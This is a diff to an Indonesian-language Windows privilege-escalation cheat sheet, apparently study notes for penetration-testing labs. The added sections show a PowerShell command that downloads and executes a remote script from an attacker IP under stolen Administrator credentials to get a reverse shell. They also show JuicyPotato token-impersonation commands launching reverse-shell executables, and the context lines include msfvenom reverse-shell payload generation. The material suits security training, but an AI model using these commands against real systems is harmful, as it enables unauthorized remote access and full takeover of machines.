@@ -1,5 +1,7 @@
 # Windows Privilege Escalation
 
+
+
 ## MSFVENOM
 ### 32 Bit
 ```
@@ -13,6 +15,31 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.8 LPORT=4545 -f exe -o
 ```
 
 
+## Run As Administrator
+Jika kita telah mendapatkan initial access dan mengetahui password dari user low tersebut maka kita bisa coba menjalankan perintah as administrator. Misal tedapat user dengan nama 
+```
+username : mrdoel
+password: myPassword123
+```
+
+Maka untuk menjalankan perintah dengan administrator perintahnya
+1. Jika kita ingin menggunakan credential di windows dgn powerhshell maka kita harus membuatnya dengan PSCredential
+```shell
+# membuat credential terlebuh dahulu
+$pass = convertto-securestring 'myPassword123' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator', $pass)
+```
+
+Untuk melihat hasilnya panggil variable
+```
+$pass
+$cred
+```
+
+2. Lalu hasil dari `$cred` digunakan untuk menjalankan perintah as administrator, dalam kasus ini kita coba melakukan reverse shell
+```
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.8:8081/Invoke-Powershell.ps1')" -Credential $cred
+```
 ## Insecure Service Permissions
 Service merupakan program-program pada windows yang dijalankan pada background. Terkadang menerima input atau menjalankan sebuah task
 Jika sebuah **service** dijalankan dengan privileges **SYSTEM** dan terdapat misconfiguration, maka kita bisa melakukan priv esc. 
@@ -803,7 +830,7 @@ PrintSpoofer64.exe -i -c "C:\Temp\Reverse.exe"
 ```
 
 ### Juicy Potato
-Pada Windows terdapat user dengan privilege services. User ini tidak bisa login, karena dia hanya bertugas untuk menjalankan tugas / service misal apache, mssql dll. Terdapat celah keamanan ketika user service ini memiliki privileges `SeImpersonatePrivilege`  atau `SeAssignPrimaryToken`dimana bisa melakukan token impersonate. 
+Pada Windows terdapat user dengan privilege services. User ini tidak bisa login, karena dia hanya bertugas untuk menjalankan tugas / service misal apache, mssql dll. Terdapat celah keamanan ketika user service ini memiliki privileges `SeImpersonatePrivilege`  atau `SeAssignPrimaryToken`  dimana bisa melakukan token impersonate. 
 
 Cara untuk exploit celah ini adalah dengan menggunakan Juice Potatal https://github.com/ohpe/juicy-potato  , juicy potato hanya work sampai windows 7. Sedangkan untuk windows 10 kita bisa gunakan Rogue Potato
 
@@ -811,18 +838,26 @@ Cek dulu `whoami /priv`
 
 Lalu cara untuk menjalankan juicy potato
 ```
+JuicyPotato.exe -t * -p rev.exe -l 4444
+```
+Kalau diatas gak bisa pakai cara ini :
+
+```
 .\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {xxx}
 ```
 
 Penjelasan
-* -l local port
-* -p program yang akan dijalankan
+* -l local port (ini sembarang aja asal gak sama dengan local port di victim machine)
+* -p program yang akan dijalankan (reverse shell attacker)
 * -t createprocess all
 * -c CLSID, adalah unique number untuk mengidentifikasi setiap komponen aplikasi di windows. cek disini https://github.com/ohpe/juicy-potato/tree/master/CLSID , sesuaikan dengan sistem operasi dan privilege. Misalnya Windows 7 dan privilege `NT AUTHORITY\SYSTEM` maka CLSID nya ``{03ca98d6-ff5d-49b8-abc6-03dd84127020}``
 
 ```
 .\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
 ```
+
+## whoami /priv explanation
+https://github.com/gtworek/Priv2Admin
 
 ## Port Fowarding
 Terkadang ada exploit yang mudah ditemukan namun program yang ingin kita exploit itu berjalan di local system (hanya bisa diakses local). Dalam hal ini kita perlu melakukan **port forwarding**. 
@@ -853,3 +888,9 @@ Perintah diatas berfungsi untuk port forwarding dari 445 attacker machine ke por
 12. Cek internal port, mungkin ada sesuatu yang menarik, kita bisa forward portnya  menggunakan `plink.exe` agar bisa diakses dari attacker machine
 13. Jika masih belum bisa nemu priv esc ke admin, coba baca lagi hasil enumeration dan coba pahami lagi mungkin ada yang menarik, cek nama yang mungkin tidak familiar di windows, jika masih belum bisa juga, coba kernel exploits
 14. Don't panic
+
+## Another Reference
+![Windows Priv Esc Mindmap](https://github.com/C0nd4/OSCP-Priv-Esc/blob/main/images/Windows%20Privilege%20Escalation.png?raw=true)
+
+
+![xhxBrofessor](https://github.com/hxhBrofessor/PrivEsc-MindMap/raw/main/windows-mindMap.JPG)
